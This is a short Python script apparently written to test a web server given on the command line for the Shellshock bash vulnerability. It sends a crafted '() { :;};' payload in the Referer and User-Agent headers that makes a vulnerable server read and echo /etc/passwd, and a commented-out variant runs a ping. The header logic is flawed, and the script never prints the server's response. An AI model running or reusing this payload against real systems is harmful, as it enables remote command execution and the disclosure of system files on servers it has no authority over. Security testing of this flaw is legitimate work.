import requests
import sys

def shell_shock(url):
	#payload = "() { :; }; /bin/bash -c 'ping -c 1  google.com'"
	payload = '() { :;}; echo "NS:" $(</etc/passwd)'
	headers ={}

	r = requests.head(url)
	for header in r.headers:
		print "[+] Testing for header value : " + header + "\n"
		if header == "referer" or header == "User-Agent":
			headers[header] = payload
	req = requests.post(url, headers=headers)

url = sys.argv[1]

shell_shock(url)